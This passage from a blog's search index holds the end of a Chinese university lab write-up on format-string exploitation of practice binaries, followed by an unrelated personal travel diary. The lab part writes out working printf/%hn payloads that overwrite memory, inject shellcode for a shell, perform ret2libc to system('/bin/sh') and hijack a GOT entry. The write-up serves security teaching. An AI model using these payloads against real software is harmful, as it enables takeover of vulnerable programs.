0xdeadbeef"></a>将变量 var 的值，从 0x11223344变成 0xdeadbeef</h3><p>由于0xbeef&lt;0xdead。所以按照刚才的办法不能够打印0xbeef，可以变为1beef，在存入时高位会被忽略</p><p>0xdead&#x3D;57005</p><p>57005-4-4-4-40&#x3D;56,953</p><p>0x1beef&#x3D;114415</p><p>114415-57005&#x3D;57,410</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $(printf &quot;\x4A\xd0\xff\xff@@@@\x48\xd0\xff\xff&quot;)%.8x%.8x%.8x%.8x%.8x%.56953x%hn%.57410x%hn&gt;input</span><br><span class="line">./prog1 &lt;input</span><br></pre></td></tr></table></figure><p>执行后可以看到地址变为了0xdeadbeef</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230516200741123-168473202105025.webp" alt="image-20230516200741123"></p><h1 id="任务2"><a href="#任务2" class="headerlink" title="任务2"></a>任务2</h1><h3 id="开启-Stack-Guard-保护，并关闭栈不可执行保护，通过shellcode-注入进行利用，获得-shell"><a href="#开启-Stack-Guard-保护，并关闭栈不可执行保护，通过shellcode-注入进行利用，获得-shell" class="headerlink" title="开启 Stack Guard 保护，并关闭栈不可执行保护，通过shellcode 注入进行利用，获得 shell"></a>开启 Stack Guard 保护，并关闭栈不可执行保护，通过shellcode 注入进行利用，获得 shell</h3><p>编译prog2源代码<code>gcc  -fstack-protector -z execstack -o prog2 prog2.c -m32</code></p><p>创建空的input文件然后执行prog2</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230516204425471-168473202105027.webp" alt="image-20230516204425471"></p><p>将恶意代码的起始位置定为0xffffcfe4+0x90&#x3D;0xffffd074</p><p>得到EBP的地址为0xffffcfc8</p><p>返回地址为EBP+4&#x3D;0xffffcfcc</p><p>将0xffffd074写入地址0xffffcfcc</p><p>将下面的shellcode写入input判断在目标第几个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">&quot;\xce\xcf\xff\xff@@@@\xcc\xcf\xff\xff&quot;</span>)%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x &gt; input</span><br></pre></td></tr></table></figure><p>如下图所示在第17个<img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517162832465-168473202105029.webp" alt="image-20230517162832465"></p><p>编写exp.py脚本，注意运用了deadbeef中的技巧，利用舍去高位的1来实现相减</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517171702506-168473202105031.webp" alt="image-20230517171702506"></p><p>运行后input中即为我们构造的shellcode，再运行prog2即可获得shell</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517171539583-168473202105033.webp" alt="image-20230517171539583"></p><h3 id="开启-Stack-Guard-保护，并开启栈不可执行保护，通过ret2lib进行利用-，获得-shell"><a href="#开启-Stack-Guard-保护，并开启栈不可执行保护，通过ret2lib进行利用-，获得-shell" class="headerlink" title="开启 Stack Guard 保护，并开启栈不可执行保护，通过ret2lib进行利用 ，获得 shell"></a>开启 Stack Guard 保护，并开启栈不可执行保护，通过ret2lib进行利用 ，获得 shell</h3><p>编译prog2源代码<code>gcc  -fstack-protector -z noexecstack -o prog2 prog2.c -m32</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb prog2</span><br><span class="line">b main</span><br><span class="line">run</span><br><span class="line">p system</span><br><span class="line">p <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>exit、system地址</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517172857373-168473202105035.webp" alt="image-20230517172857373"></p><p>ebp地址</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517194124081-168473202105037.webp" alt="image-20230517194124081"></p><p>&#x2F;bin&#x2F;sh地址</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517193040276-168473202105039.webp" alt="image-20230517193040276"></p><p>libc.so.6基址</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517184236578-168473202105041.webp" alt="image-20230517184236578"></p><p>ebp+4(0xffffcf9C)的位置覆盖为system的地址0xf7c4c800</p><p>ebp+8(0xffffcfa0)的位置覆盖为exit的地址0xf7c3bc90</p><p>ebp+12(0xffffcfa4)的位置覆盖为&#x2F;bin&#x2F;sh的地址0xf7db5faa</p><table><thead><tr><th align="center">覆盖地址</th><th align="center">覆盖内容</th></tr></thead><tbody><tr><td align="center">0xffffcfa4</td><td align="center">5faa</td></tr><tr><td align="center">0xffffcfa0</td><td align="center">bc90</td></tr><tr><td align="center">0xffffcf9c</td><td align="center">c800</td></tr><tr><td align="center">0xffffcfa2</td><td align="center">f7c3</td></tr><tr><td align="center">0xffffcf9e</td><td align="center">f7c4</td></tr><tr><td align="center">0xffffcfa6</td><td align="center">f7db</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">&quot;\xa4\xcf\xff\xff@@@@\xa0\xcf\xff\xff@@@@\x9c\xcf\xff\xff@@@@\xa2\xcf\xff\xff\x9e\xcf\xff\xff@@@@\xa6\xcf\xff\xff&quot;</span>)_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x &gt; input</span><br></pre></td></tr></table></figure><p>第一个地址在第17个出现</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517185237045-168473202105043.webp" alt="image-20230517185237045"></p><p>用相同的方法构造shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">&quot;\xa4\xcf\xff\xff@@@@\xa0\xcf\xff\xff@@@@\x9c\xcf\xff\xff@@@@\xa2\xcf\xff\xff\x9e\xcf\xff\xff@@@@\xa6\xcf\xff\xff&quot;</span>)_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.24314x%hn_%.23781x%hn_%.2927x%hn_%12226x%hn_%hn_%.22x%hn &gt; input  </span><br></pre></td></tr></table></figure><p>以下是执行后的效果，成功获取shell</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517194538145-168473202105045.webp" alt="image-20230517194538145"></p><h1 id="任务3"><a href="#任务3" class="headerlink" title="任务3"></a>任务3</h1><h3 id="开启-Stack-Guard-保护，并开启栈不可执行保护，-通过-GOT-表劫持，调用-win-函数"><a href="#开启-Stack-Guard-保护，并开启栈不可执行保护，-通过-GOT-表劫持，调用-win-函数" class="headerlink" title="开启 Stack Guard 保护，并开启栈不可执行保护， 通过 GOT 表劫持，调用 win 函数"></a>开启 Stack Guard 保护，并开启栈不可执行保护， 通过 GOT 表劫持，调用 win 函数</h3><p>sudo sysctl -w kernel.randomize_va_space&#x3D;2</p><p>gcc  -fstack-protector -z noexecstack -o prog2 prog2.c -m32</p><p>win函数地址如下所示</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517230954117-168473202105047.webp" alt="image-20230517230954117"></p><p>查找printf@got的地址</p><p>首先看fmtstr函数查找printf@plt的地址</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517234750750-168473202105149.webp" alt="image-20230517234750750"></p><p>在此基础上找到printf@got的地址</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/QQ%25E6%2588%25AA%25E5%259B%25BE20230517234830-168473202105151.webp" alt="QQ截图20230517234830"></p><p>即在0x804a00c地址上写入0x804850b</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">&quot;\x0e\xa0\x04\x08@@@@\x0c\xa0\x04\x08&quot;</span>)_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.1904x%hn_%.32006x%hn &gt; input  </span><br></pre></td></tr></table></figure><p>如下所示，执行了win函数</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230517234508778-168473202105153.webp" alt="image-20230517234508778"></p>]]></content>
      
      
      <categories>
          
          <category> learn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> learn </tag>
            
            <tag> HUST_lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旅行日记</title>
      <link href="/2023/05/20/travel/"/>
      <url>/2023/05/20/travel/</url>
      
        <content type="html"><![CDATA[<h2 id="2023-x2F-04-x2F-27"><a href="#2023-x2F-04-x2F-27" class="headerlink" title="2023&#x2F;04&#x2F;27"></a>2023&#x2F;04&#x2F;27</h2><ul><li><p>来接机啦！为什么会有人找行李这么慢呀，好笨一个</p></li><li><p>她足足找了半个小时的行李！！</p></li></ul><h2 id="2023-x2F-04-x2F-28"><a href="#2023-x2F-04-x2F-28" class="headerlink" title="2023&#x2F;04&#x2F;28"></a>2023&#x2F;04&#x2F;28</h2><ul><li>去了湖北省博物馆，看了好多新奇的小玩意</li></ul><table><thead><tr><th align="center">奇怪的。。小人？？</th><th align="center">介是小鹿嘛</th><th align="center">历经了几千年的金头饰还这么亮呐</th></tr></thead><tbody><tr><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/20230428_1.webp" style="zoom: 30%;" /></td><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0428_2.webp" style="zoom: 30%;" /></td><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0428_3.webp" style="zoom:30%;" /></td></tr><tr><td align="center"><strong>越王勾践剑！(我以前一直以为叫鱼肠剑来着)</strong></td><td align="center"><strong>编钟表演里呆滞的小哥</strong></td><td align="center"><strong>想到了七星鲁王宫</strong></td></tr><tr><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/7909E24A56D4C794506426BB6AD4DB95.webp" alt="img" style="zoom:10%;" /></td><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0428_5.webp" style="zoom:28%;" /></td><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/D89F474468957383351280E9B3E50842.webp" alt="img" style="zoom: 10%;" /></td></tr></tbody></table><h2 id="2023-x2F-04-x2F-29"><a href="#2023-x2F-04-x2F-29" class="headerlink" title="2023&#x2F;04&#x2F;29"></a>2023&#x2F;04&#x2F;29</h2><ul><li><p>江滩上的小郭貌似不太满意</p><table><thead><tr><th align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/80576AB52C9634DA0B110DF69E1DEB64.webp" alt="img" style="zoom: 20%;" /></th></tr></thead><tbody><tr><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/QQ%E5%9B%BE%E7%89%8720230524213313.webp"  style="zoom:20%;" /></td></tr><tr><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/QQ%E5%9B%BE%E7%89%8720230524213748.webp" style="zoom: 20%;" /></td></tr></tbody></table></li></ul><h2 id="2023-x2F-04-x2F-30"><a href="#2023-x2F-04-x2F-30" class="headerlink" title="2023&#x2F;04&#x2F;30"></a>2023&#x2F;04&#x2F;30</h2><ul><li><p>来看张杰演唱会啦！！</p><p>有人她好兴奋</p><table><thead><tr><th><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0430_1.webp" style="zoom:25%;" /></th><th><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0430_2_20230522_145013.webp" style="zoom:20%;" /></th><th><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0430_6.webp" style="zoom:20%;" /></th></tr></thead></table></li><li><p>不得不说场控灯光做的好好啊~不过缺点就是位置太远啦，看不太清，可恶的黄牛！！！</p></li></ul><table><thead><tr><th align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0430_5.webp" style="zoom:15%;" /></th></tr></thead><tbody><tr><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0430_3.webp" style="zoom:15%;" /></td></tr><tr><td align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0430_4.webp" style="zoom:15%;" /></td></tr></tbody></table><h2 id="2023-x2F-05-x2F-01"><a href="#2023-x2F-05-x2F-01" class="headerlink" title="2023&#x2F;05&#x2F;01"></a>2023&#x2F;05&#x2F;01</h2><ul><li><p>东湖磨山（可惜时间太晚了没有坐上滑道😒）</p><table><thead><tr><th align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0501_1_20230522_144812.webp" style="zoom:15%;" /></th><th align="center"><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0501_2.webp" style="zoom:15%;" /></th></tr></thead></table></li></ul><h2 id="2023-x2F-05-x2F-02"><a href="#2023-x2F-05-x2F-02" class="headerlink" title="2023&#x2F;05&#x2F;02"></a>2023&#x2F;05&#x2F;02</h2><ul><li>这真的是倒数第二悲伤的且没有兴致的一天~</li></ul><h2 id="2023-x2F-05-x2F-03"><a href="#2023-x2F-05-x2F-03" class="headerlink" title="2023&#x2F;05&#x2F;03"></a>2023&#x2F;05&#x2F;03</h2><ul><li>最最最最难过的一天😢</li></ul><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/0502_1.webp" style="zoom:15%;" />]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> travel </tag>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
